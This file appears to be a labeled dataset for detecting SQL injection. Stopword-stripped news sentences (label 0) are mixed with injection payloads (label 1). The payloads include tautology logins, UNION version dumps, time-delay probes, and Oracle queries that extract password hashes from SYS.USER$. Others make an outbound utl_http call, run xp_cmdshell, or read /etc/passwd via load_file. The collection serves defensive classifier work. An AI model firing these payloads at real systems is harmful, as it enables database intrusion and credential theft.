Sentence,Label
8 percent month October,0
In expert circles referred &quot; HQ 100aKlima &quot;,0
But passengers &apos;t expect changes happen immediately,0
"select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'",1
"The eager Oregon , enlisting 5,000 drivers country &apos;s biggest experiment",0
"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1
"Still , Obama &apos;s approval rating sank 45% week , returning 2008 book become much harder",0
"Dick &apos; God experiences &apos; , later books read like mixture Book Revelation computer manual",0
"&quot; I longer remember victory like tastes , &quot; said Malmon , anticipating success team VfL Fredenbeck II",0
&quot; The Times obtained copy forthcoming book reported Thursday evening President &apos;s top aides conducted &quot; extensive group-sessions polling late 2011 &quot; gauge whether dumping Biden could help bolster Obama &apos;s waning re-election hopes,0
The judging panel also award bonus points &quot; outfits &quot;,0
"Nonetheless , worth watching",0
select * from users where id = 1 or \<1 or 1 = 1 -- 1,1
' )  or  ( 'x' )  =  ( 'x,1
"A day thanks MGV (Male Choral Society) Dinker This year &quot; Friedrich Wilhelm Dinker &quot; MGV issued invitation 165th anniversary celebration , 52 guests , active singers wives happy accept",0
"Fighting back tears , said Patek sentenced death",0
"A dough becomes fluffy replacing egg mixture one tablespoon baking powder , one tablespoon cornflour three tablespoons mineral water , example",0
""" or true--",1
"&quot; Our current policy electronic devices cannot used take-off landing immediate plans change , &quot; said",0
"The national intelligence director , James Clapper , defended spying allies necessary said &apos;s commonplace sides",0
"So far , candidate succeed Mayor Norbert Brugger , longer running account age , 46-year-old banker business economist Dieter Köpfler Löffingen",0
"select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1
"For flyers elbow room , suppliers increasingly issue could affect earnings",0
"I would write lintels door-post, Whim",0
"select * from users where id = 1 or ""{%"" or 1 = 1 -- 1",1
procedure,1
union all select @@version--,1
‘ or 1 = 1 --,1
Arnold explained technology used new system: It fitted two radar sensors,0
"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 )",1
admin'/*,1
"select * from users where id = '1' or  ( \ )  = 1 union select 1,@@VERSION -- 1'",1
spying convince Europeans need continue joint anti-terrorism efforts U,0
The scene &quot; like something movie &quot;,0
"For 21 years , Georges Bwelle watched ill father slip consciousness , traveling hospitals &apos;t equipped help",0
"&quot; It &apos;s obviously worrying time &apos;re hopeful back home safely soon possible , &quot; Tunks said",0
"Across EU , parties dedicated opposing EU , scrapping euro common currency , gaining ground",0
' or a = a--,1
6bn,0
"He Kerr still love , emphasised 36-year-old",0
"Nevertheless , reconstruction railway crossing consented majority , provision required supporting wall built way town could , required , extend connecting road &quot; Bahnhofstraße &quot; direction around 5",0
"The waiting time must , however , &quot; appropriate &quot; , interpreted differently case-to-case basis",0
"Their motto , large billboard stated &quot; We unfinished buildings &quot;",0
"In joint meeting Saturday , committees Haslach , Hofstetten , Mühlenbach , Fischerbach , Steinach Welschensteinach prepared changes",0
"&quot; For vast majority people health insurance works , keep , &quot; said speech Boston",0
"select * from users where id = '1' union select "";""_,version (  )  -- 1'",1
5: 00 p,0
"In addition , cleaned widened footpath , press release announced",0
"As pastoral workers , ministers close people",0
Mr Snowden said letter faced &quot; severe sustained &quot; campaign persecution forced home,0
"&quot; Our vision come back negotiations , seriousness , &quot; Mr Mazanga said",0
"&quot; Motorists would attracted participate value benefits offers , &quot; says city planning document",0
"select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",1
He buried deceased forest - continued collect pension care allowance,0
The Winter season within industry begins mid-December,0
In wanted point danger even bigger ruins Schweizer Wiese - huge project one day fail,0
auto safety regulators Friday,0
"&quot; The reason Boeing cram seats make plane competitive products , &quot; said Kevin Keniston , head passenger comfort Europe &apos;s Airbus",0
or 'unusual'  =  'unusual',1
"&quot; I remain patchwork created doctors , bruised scarred",0
"select * from users where id = 1 union select @ $_,version (  )  -- 1",1
"The verdict comes ahead 10th anniversary attack later year , marked ceremonies Bali Australia",0
or 'something'  =  'some'+'thing',1
' or 1 in  ( select @@version ) --,1
"Dick God seeker , metaphysician , certain extent novels stories also feature recurring themes",0
' or 2 > 1,1
Patron Johan Philipp Neumann mind mass performed part church services,0
"&quot; These cartels stupid think dig radar , &quot; said US Attorney District Southern California , Laura Diffy , press conference held front warehouse San Diego , end tunnel discovered",0
"If , possible , anti-EU parties well elections , bloc could dominate European Parliament first time",0
Society everywhere conspiracy manhood every one members,0
Mayor Ralph Gerster thanked Rothmund team good work,0
But went way beyond ordinary confines lawyer-client relationship,0
"While airport management announced via short messaging service Twitter shooter custody , &quot; Los Angeles Times &quot; reported man dead",0
"In Town Parliament , Röhrenbeck asked whether Town Council planning discussions postal service regarding matter",0
Click image gallery performance &quot; singing mountain wave &quot;,0
"The inseparable pair - height - commended appearance , behaviour style annual contest run Sunnybank Equestrian Centre , Rudry near Cardiff",0
)  or  ( a = a,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
"Because androgen receptors faulty , Katie developed female characteristics",0
"9 billion candy , costumes decorations , according National Retail Federation",0
"select * from users where id = 1 or ""?#"" or 1 = 1 -- 1",1
"Few mean gifts may be, I actually am, need assurance assurance fellows secondary testimony",0
"&quot; We aspire better tomorrow , new Egypt second republic , &quot; Morsi said solemn ceremony shown live state television",0
"With Scottish-Swabian Highland Games tractor pulling contest , begin half hour beforehand , promises great deal action event grounds Saturday",0
Globe-trotting jet sellers even carry tape measures check competing layouts,0
"And I &apos;m going Europe make clear need continue work together combatting terrorism , notwithstanding anger NSA programs",0
"Furthermore , role old fisherman character role , , Janson masters excellently",0
"When rebels , experiences extreme cruelty hands wantonly sadistic Mother Superior becomes object erotic fascination another",0
"Similarly UK , Flight Centre &apos;s leisure business performed well corporate clients spending less",0
"select * from users where id = 1 or @#"", = 1 union select 1,version (  )  -- 1",1
1;SELECT *,1
"&quot; The test plane &apos;t stay ground longer anticipated , &quot; Beaudoin said conference call , adding ground tests software updates scheduled plane &apos;s downtime",0
They earn much teachers make good living,0
"Another , particularly important factor networking universities companies",0
"The city appealed findings remedial orders , including decision assign monitor help police department changes policy training program associated",0
"The 67-year-old must face charges fraud , said spokesperson Friday",0
"Everything subsidised Germany , coal , cars farmers",0
' or uid like '%,1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",1
Someone German parliament says build German Google,0
"Frontier Airlines plans start charging $ 100 carry-on bag $ 2 coffee soda , although announcement Wednesday say passengers get keep whole",0
"The aim law take pressure parents might make hasty decisions sex-assignment surgery newborns , fight discrimination intersex",0
"Norway: Norwegian village lights huge mirrors Using huge mirrors , residents Norwegian village brought light dreary valley",0
"&quot; The gas tax sustainable , &quot; said Lee Munnich , transportation policy expert University Minnesota",0
'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,1
Normally cocaine smuggled smaller quantities tunnels,0
"&quot; After , I one insulted , &quot; emphasised 46-year-old",0
"Jet makers feud seat width big orders stake A row flared leading plane makers width tourist-class seats long-distance flights , setting tone bitter confrontation month &apos;s Dubai Airshow",0
x' AND members.email IS NULL; --,1
declare @s varchar ( 200 )  select @s  =  0x77616974 ...,1
"A chips , coke , burger - straight home bed ! However , way home clear differences hungry clubbers become evident",0
They said active within Rocker scene time belonged Bandidos,0
"Larger vehicles , example transport long logs , would able wait event oncoming traffic , without block railway line",0
or 0 = 0 --,1
"Immediately local district derby FC Schalke 04 , travelling BVB fans fired flares crowds spectators onto pitch - almost hit goalkeeper Roman Weidenfeller",0
"I ashamed think easily capitulate badges names, large societies dead institutions",0
In ladies &apos; race Theresa Duelli Team Albtraum managed take top place podium,0
"select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1
"However , beginning resign town continues stall providing answers , said statement citizen &apos;s initiative",0
There currently 403 total orders commitments 15 customers operators,0
"Her new album , &quot; Prism , &quot; debuted No",0
"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1
desc,1
The order backlog transportation unit $ 32,0
According State Government additional elective procedures largely reverse recent cuts,0
’ or ‘1’ = ’1,1
"However , Damascus still start destroying existing weapons stockpiles",0
"Green Party parliament representative , Hans-Christian Ströbele , yesterday first German politician meet Snowden Moscow , discuss scandal",0
"&quot; You &apos;re going get better deal , &quot; said",0
"The US National Intelligence Estimate February named France alongside Russia Israel second tier offenders engage hacking economic intelligence , behind China , according The Washington Post",0
"In Germany , many companies global market leaders particular niche",0
"&quot; I opinion sufficient basis exists &quot; formal investigation , said",0
83 mid afternoon trading Thursday,0
"&quot; Hopefully &apos;t afraid spiders ? &quot; asks Waltraud Ries , pointing large spider door frame",0
"Men imagine communicate virtue vice overt actions, see virtue vice emit breath every moment",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
Managing director Graham Turner said Flight Centre made 8 per cent profit first half started second half strongly especially Australian UK non-business travel,0
"As , pair complement one another superbly",0
The probe launched 2017 closely observe surface activity sun,0
"At least six authorities globally - European Commission , Finma , Switzerland &apos;s competition authority Weko , FCA , Department Justice US Hong Kong Monetary Authority - looking allegations bankers colluded move currencies market",0
"The newspaper tasked private investigator Glenn Mulcaire hacking Pawlby &apos;s voicemails &quot; door-stepped &quot; , Coulson also called left voicemails , court heard",0
""" or """" """,1
"Finally , tellingly , poll business leaders found clear majority wanted see Britain pursue course treaty change relationship EU based trade , politics",0
'||utl_http.request ( 'httP://192.168.1.1/' ) ||',1
&1c,1
"In interview overnight mark fifth anniversary departure office , 59-year-old aired views various domestic policies",0
Rescue workers entered premises found body bedroom,0
"select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'",1
"To end , competent working group met morning",0
The punctuation prediction problem attracted research interest speech processing community natural language processing community,0
"Schiltach contribute EUR 220,000 project",0
"Why independent Scotland expected Europe &apos;s bidding , anyway ? Why trade London &apos;s yoke Brussels , especially ? Here real European news: great , post-war plan unite Europe finally stalled",0
"As soon acted spoken eclat, committed person, watched sympathy hatred hundreds, whose affections must enter account",0
"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1
select * from users where id = '1' <@$_ or 1 = 1 -- 1',1
"select * from users where id = 1 or 1#""$ union select version (  ) ,version (  )  -- 1",1
News probes rattled traders area one bigger profit drivers investment banks &apos; trading units past years challenged year low volatility currencies cuts opportunities speculators,0
"Absolve yourself, shall suffrage world",0
"Supporters changes NYPD &apos;s stop-and-frisk program say changes end unfair practices , mold trusted effective police force affect police departments use policy",0
@variable,1
truncate,1
"The meeting point tours Cologne Tourism Service Centre , right cathedral",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
admin' or '1' = '1'#,1
"&quot; After many years , reached agreement International Nuclear Energy Authorities clear differences past years , &quot; wrote Foreign Minister Mohammed Dschawad Sarif Facebook page",0
The pair managed break away field keeping expectations,0
"select * from users where id = 1 or @#""{ = 1 union select 1,version (  )  -- 1",1
This message 9th &apos; Immobilientag &apos; (Property Day) organised Börsen Zeitung (stock exchange newspaper),0
"The Ecumenical Discussion Forum initiative Catholic Protestant churches Salem , Salem Castle Lake Constance District Cultural Office",0
Honor venerable us ephemeris,0
"Stop-and-frisk around decades form , recorded stops increased dramatically administration independent Mayor Michael Bloomberg all-time high 2011 684,330 , mostly black Hispanic men",0
An employee security company TSA suffered gunshot wound foot,0
"The former German soldier , following two tours Afghanistan , worked doorman , made confession within context plea-bargaining procedure",0
"&quot; We want peace back; want stability , &quot; said Vanessa de Sousa , chief executive investment company",0
That &apos;s something &apos;d ever get America second-year medical student,0
"According survey carried Cloud Security Alliance , trade body , 10 per cent non-US members cancelled plans use US-based cloud provider revelations US Prism data mining programme",0
"For comparison &apos;s sake , ratio United States one doctor every 413 people",0
Pimp must go prison The District Court Constance condemned 33-year-old man St,0
"Rockstar seeking increased damages Google , claims Google &apos;s patent infringement willful , according complaint",0
"In rare instances low visibility , crew instruct passengers turn devices landing",0
"However , aware one people actually deal topic &apos; living old age &apos;",0
' or 1 --',1
"Jamef Bwelle injured 1981 car accident near Yaounde , Cameroon &apos;s capital",0
"In May , meeting Town Council , said feared outcome spa population vote plans spa wellness complex Schweizer Wiese local referendum",0
exec xp,1
"The antibodies hunt nicotine molecules bloodstream , neutralising reached brain , preventing smoker getting nicotine hit",0
"The funding , four years , decided government consultations Tasmanian independent MP Andrew Wilkie",0
"select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",1
||6,1
"Of , said 61,067 civilians , including 6,365 children",0
"Following Mr Chen &apos;s apology , New Express issued front-page apology , saying failed properly check reports",0
"Another conundrum: Although boys getting facial pubic hair younger ages , trend toward full-blown early puberty pronounced girls",0
My book smell pines resound hum insects,0
"5million along £ 200,000 cash series raids",0
Harkam also played &quot; part &quot; escalation Salzburg Coach Roger Schmidt Grödig Trainer Adi Hütter game,0
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1
%29,1
select * from users where id = 1 %!<@ or 1 = 1 -- 1,1
anything' or 'x' = 'x,1
Costumes expected account $ 1,0
"&quot; No one cares Renamo Frelimo , want peace , want free access roads , &quot; said",0
having,1
"&quot; The Secretary State also admitted &apos;d guilty , along Barack Obama , &quot; automatic pilot &quot; incendiary revelations whistleblower Edward Snowden NSA &apos;s spying activities emerged",0
"select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1
select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1
"select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1
"select * from users where id = '1' union select ||/1,version (  )  -- 1'",1
Previous talks parties done little ease tensions fuelled series clashes year,0
"On occasion Geisingen town anniversary , new chronicle also published",0
"Unsure , government Jerusalem officially confirmed attack",0
"He wrote &apos; Theology Computer &apos; questioned separates humans machine , creator creation",0
"A man Caesar born, ages Roman Empire",0
The scientists behind project hope Elisa could achieve,0
"Two months election , electoral commission officially declared Mr Palmer winner Sunshine Coast seat Fairfax 53 votes , recount",0
It attractive able determine daily working routine,0
He helped conduct 2001 study 6- 9-year-old girls links body fat timing puberty,0
"Warplanes attack store Russian missiles port city Latakia , official says",0
"After 20 days smoke , ham finally almost black",0
"I replied, They seem such; I Devil’s child, I live Devil",0
"The police completely blocked road immediately , initially could make much comment cause accident",0
15 p,0
A federal appeals court blocks judge &apos;s ruling NYPD &apos;s controversial tactic discriminates minorities,0
"select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1",1
( s,1
"&quot; Decisions made elsewhere , &quot; said Maier",0
"The victims said belonged competing gang , Hell &apos;s Angels",0
or pg_sleep ( __TIME__ ) --,1
"&quot; We concerning wild card process certain Düsseldorf receiving licence , &quot; said boss Neckar Riesen Alexander Reil , speaking paper",0
Both communities thus mentioned deed,0
"&quot; The law gives parents space rush making decisions , &quot; said Baratz",0
"The town Geisingen first officially documented year 764 , deed donation , possession St",0
", found Jan",0
"In end , endurance Maier / Bronner team decided final match",0
; or '1' = '1',1
I &apos;t signed past two years give candy apartment probably &apos;t year,0
"Great men always done so, confided childlike genius age, betraying perception absolutely trustworthy seated heart, working hands, predominating being",0
The crisis euro little national governments running excessive budget deficits - true Greece,0
x' or 1 = 1 or 'x' = 'y,1
"Of 30 proposals , two remain end selection procedure",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
"There 30 proposals choose , five still running",0
Checks generally carried sender &apos;s provider whether mail contains malware attachment,0
"’ — Is bad, then, misunderstood? Pythagoras misunderstood, Socrates, Jesus, Luther, Copernicus, Galileo, Newton, every pure wise spirit ever took flesh",0
People paying directly getting,0
"Konstanz: Cyclist knocks 63-year-old man According police , accident occurred Thursday evening around 10: 00 p",0
' union select,1
"After eight-hour flight , headed straight Brooklyn Bridge , via heart city , Manhattan , reached foot",0
"YMCA NSW child safe organisation time Jonathan Lord employed 2009 2011 , child sex abuse expert Professor Stephen Smallbone Griffith University told commission",0
"select * from users where id = '1' union select \#,@@VERSION -- 1'",1
Americans spend $ 1,0
"Just five minutes kick-off , Capo climbed onto podium - tension almost tangible point , lifted large shout , Dickel asked shout section fans usual",0
The victim later died result serious injuries,0
"Both Airbus Boeing claim 20 per cent better efficiency per seat latest twin-engined long-haul designs market leader segment , 365-seat Boeing 777-300ER",0
"select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1",1
%2A%7C,1
1 and 1 = 1,1
"But opening statement Commission said &quot; never dealt incident child sexual assault within organisation , &quot; Commission told",0
"1 per cent indeed better previous year also better September , &quot; however , hoped , &quot; said Monika Felder-Bauer , acting branch manager Employment Agency Sonthofen",0
The residents Bischof-Freundorfer-Weg reported car wrapped toilet paper wheel trims stolen,0
select * from users where id = 1 +$+. or 1 = 1 -- 1,1
"Rapes almost part everyday life South Africa: There around 64,000 reports sexual assault every year",0
"select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1
"Expressions Middle Ages addressed Parish Councillor Christel Dehner: &quot; Aller guten Dinge sind drei &quot; (All good things come threes), &quot; blau machen &quot; (to skip school / work), &quot; etwas verhauen &quot; (to wallop something)",0
"He said NotW used three ways investigate stories: phone hacking , surveillance , confrontation",0
'+sqlvuln,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,1
Sentence boundary detection punctuation prediction extensively studied speech processing field attracted research interest natural language processing field well,0
PRINT,1
At least one hacktivist group online claimed responsible bringing NSA site DDoS attack,0
"Be will, right now",0
select * from users where id = 1.<@. or 1 = 1 -- 1,1
"Her owners Scott Alderson , 25 , girlfriend Becky Hall , 20 , Flappit Quarry Denholme , West Yorkshire , reunited Ruby thanked West Yorkshire Fire Rescue Service",0
Expect show cause I seek I exclude company,0
"select * from users where id = 1<@<@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1
"The deadline applications Monday 11 November , 6: 00 p",0
"If municipalities agree reconstruction measures , required contribute one third costs , remainder divided Deutsche Bahn Federal Government",0
"Last month , people close situation said RBS turned records emails instant messages UK regulator , Financial Conduct Authority , sent former trader",0
"select * from users where id = '1' or \.<  = 1 union select 1,@@VERSION -- 1'",1
"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",1
Most previous work exploits local features task,0
"German companies believe US poses almost big risk China comes industrial espionage data theft , according survey published July EY , consultancy",0
A decision expected made coming year,0
declare @s varchar  ( 8000 )  select @s  =  0x73656c ...,1
Add plain text Ne te quaesiveris extra,0
"Among issues , topics discussed included direct democracy , bribery MPs Federal Police",0
The issue covered regulations require aircraft operators ensure safety maintained times passengers comply safety instructions given crew members,0
"select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
"Passengers told switch smartphones , tablets devices airplane mode",0
"The building , workshop integrated stabling two horses , easy secure",0
"After first three matches lunch break pasta , tournament moved crucial phase",0
"Since 2008 , group volunteers helped nearly 32,000 people",0
This mail server sends content provider Benni uses,0
"select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1
"When grown , make decisions bodies",0
"9 billion year , according The Nielsen Company",0
The man reported taken safety area,0
"It possible investigate processes solar system , serve example applied elsewhere",0
It faithful reproduction famous work Leonardo da Vinci Milan,0
The budget &quot; L-Missions &quot; lies around one billion Euro,0
The FAA easing restrictions use electronic gadgets airplanes - though chatting cellphones still prohibited,0
health statistics,0
Its US business recovered losses seasonally weaker first half expected deliver third consecutive full year profit,0
) ;waitfor delay '0:0:__TIME__'--,1
"And poverty , cannot enjoy life",0
"The announcement came fighting raged Thursday town Safira , experts say home chemical weapons production facility well storage sites , reported Britain-based Syrian Observatory Human Rights",0
"Numerous dependency parsing algorithms proposed natural language processing community, including transition-based graph-based dependency parsing",0
"&quot; Mr Ditta accused abusing position criminal solicitor , become involved specific clients",0
select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1
"The Regional Memorial Authority major say historic school wall renovation , even used filming",0
Morris second-year student Harvard Medical School,0
"In addition , containers materials regularly sent Africa , example March year medical devices , medicines , bandaging material , hospital beds spectacles sent",0
"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",1
You leave home 5 a,0
&quot; The water rail fit well time released,0
"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",1
"Virtues are, popular estimate, rather exception rule",0
"With three gigantic mirrors , 45 metres tall , centuries-old dream came true Wednesday",0
A three-person commission set ensure state delivering services effectively efficiently possible,0
"select * from users where id = 1 <1## union select 1,version (  )  -- 1",1
The pensioner told investigators mother travelled Spain,0
"Whether person living house yet unclear , said police spokesperson Bayreuth",0
"These included Philipp Pangerl , semi-professional mountain biker Black Tusk Racing Team",0
"The Mikwe form part archaeological area Town Hall Square , construction work set begin shortly",0
"Thus , developing underlying technical protocols , attention given creating stable foundation interception-proof exchange mail",0
cgi 393 F4 read F4 634 PDS 1771 1 yetglezip 3980 wr_hit desc 497 1490110 bbs4 for_print 9,0
"admin"" )  or  ( ""1"" = ""1""--",1
"The third , Mexican , detained due seizure marijuana",0
"select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",1
"select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'",1
"With special telescope , probe examine distribution material universe across entire sky , thus enabling conclusions drawn regarding properties dark matter dark energy",0
1  )  )   or pg_sleep ( __TIME__ ) --,1
"Gutach: Increased safety pedestrians They even 100 metres apart: On Tuesday , new B 33 pedestrian lights Dorfparkplatz Gutach became operational - within view existing Town Hall traffic lights",0
"The youngster , village Nantyglo , near Ebbw Vale , South Wales , following footsteps aunt Sharon Howells , showing horses 10 years",0
"They included final draft document , endorsed world leaders including Ms Gillard summit",0
"The system , officially became operational yesterday , importance Sulzbachweg / Kirchstrasse junction",0
"They want see Government prioritise new trading links likes China , India Brazil , rather getting bogged long arduous process reforming EU &apos;s arcane institutions",0
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
A fantastic writer,0
a' or 3 = 3--,1
New York City psychiatrist Dr,0
"As festival expanded , world comedy",0
Trust thyself: every heart vibrates iron string,0
The rate 3,0
Other doctors attending AAP conference reinforced complexities topic,0
pdf 201704/00001491531111628,0
Germany &apos;s BfV advises executives consider using simple prepaid mobiles foreign trips risk smart phones compromised,0
Airbus says commissioned research suggesting extra inch seat width improves sleep quality 53 per cent,0
"The virus selectively infects liver cells , start make steady stream antibodies",0
"The deed drawn Kirchen (Hausen), time location courthouse",0
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
or 1/*,1
"A phone transcript tabled ICAC showed calls August September 2007 Mr Obeid , Mr Tripodi Steve Dunn , senior bureaucrat come ports ministry working Mr Obeid fisheries department",0
"Ordinarily, every body society reminds us somewhat else, person",0
"By comparison , Australian schools provide average 143 hours year pupils around 138 hours Singapore",0
"select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'",1
Airlines offering Wi-Fi use cruising altitudes passengers several years,0
"5 billion , sued Samsung Electronics Co Ltd , HTC Corp , Huawei four companies patent infringement U",0
0x77616974666F722064656C61792027303A303A31302700 exec ( @s ),1
or  ( EXISTS ),1
"Mr Hughes said Patek shared fate three members Jemaah Islamiah terror cell responsible carnage - Amrozi , Mukhlas Imam Samudra - executed four years ago",0
After all: Black Forest ham traditionally arrives shelf boneless,0
"At crossing , town planning increase height mouth tunnel west railway line",0
The 67-year-old finally acknowledged death mother,0
"' union  ( select NULL, NULL,  ( select @@version  )  )   --",1
"select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1
Reports US National Security Agency spied Brazilian oil company Petrobras gained access data held US cloud providers including Google Yahoo ratcheted corporate paranoia state surveillance new highs,0
Many Wall Street view addition baggage fees sign airlines charging enough money cover cost air travel years losses,0
It cannot justify findings report says White House &apos;s efforts silence media &quot; aggressive,0
Philip K,0
&quot; His addiction cocaine left hopelessly compromised vulnerable motives leading members organised crime groups tasked obtain valuable information regarding police investigations,0
' or username is not NULL or username  =  ',1
or a = a,1
O &apos;Malley said Frontier &apos;s website check-in procedures changed make sure passengers know fee get gate,0
"Thus far , Kempten Police Department look back calm Halloween night",0
; exec  ( 'sel' + 'ect us' + 'er' ),1
4 percent $ 37,0
23 or 1 = 1; --,1
"But court heard would call major players drugs supply chain , previously represented , key arrests tell detectives knew",0
I mainly I hankered money fame,0
"Prosecutors demanded life sentence , although could pushed man dubbed &quot; Demolition Man &quot; reputation master bomb-maker sentenced death",0
Earlier year Lord convicted sexual offences 12 boys two years worked YMCA,0
' or  ( EXISTS ),1
admin' --,1
They know business better anyone else,0
Only post boxes front post office building Ernst-Ludwig-Straße 36 Jakob-Müller-Straße 1 Hüttenfeld still emptied,0
create user name identified by 'pass123',1
or 2 between 1 and 3,1
select * from users where id = 1 <@<@ or 1 = 1 -- 1,1
"Consequently , particularly motivated playing former coach",0
I look forward reviewing report investigation UK ministers next year together decide next steps,0
Airlines began charging first second checked bags 2008,0
"He advised parents boy whose penis severed botched circumcision child fully castrated , removing testicles , well , raise girl",0
1 and user_name (  )   =  'dbo',1
Shortly Schänzle roundabout noticed left-turn lane going direction Stromeyersdorfstraße moved across right lane,0
"select * from users where id = 1.<@. union select 1,version (  )  -- 1",1
"&quot; We get first , commit act violence &quot;",0
Egypt swears first freely elected president Mohamed Morsi takes oath office day triumph unlikely mark end political strife Egypt,0
"The devices , track every mile motorist drives transmit information bureaucrats , center controversial attempt Washington state planning offices overhaul outdated system funding America &apos;s major roads",0
"Not nothing one face, one character, one fact, makes much impression him, another none",0
"Late Thursday evening , fire broke ground floor house",0
or 'x' = 'x,1
The backlog aerospace division $ 32,0
"select * from users where id = '1' union select ""[""_,version (  )  -- 1'",1
"The Police Chief argues division power , military controls daily life - left State",0
"select * from users where id = 1 + @<1# union select 1,version (  )  -- 1",1
select * from users where id = 1 or !<@ or 1 = 1 -- 1,1
"Hans-Peter Friedrich , German interior minister , told Zeit Online: &quot; If Mr Snowden ready speak German officials , find ways make possible",0
select * from users where id = 1 + $+%\ or 1 = 1 -- 1,1
"It loves realities creators, names customs",0
pdf 201704/00001491530253903,0
"Trading Nasdaq Options Market interrupted Friday afternoon , German time",0
"The country believed around 1,000 metric tons chemicals weapons including mustard gas nerve agent sarin",0
There Lethe this,0
He said intended avoid contamination evidence &quot; overzealous &quot; poorly executed,0
select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1
"select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or "".["" or 1 = 1 -- 1",1
"On Sunday , team heads back city , tired proud work",0
The firefighters amazing,0
"select * from users where id = 1 or 1#""? union select 1,version (  )  -- 1",1
The conclusion future work given Section 6,0
"It cannot explain National Security Agency collect data private lives Americans , prosecuting whistle-blowers reveal government wrongdoing",0
"As Andrea Rothmund explained , administrative budget came EUR one million higher originally planned , around 7",0
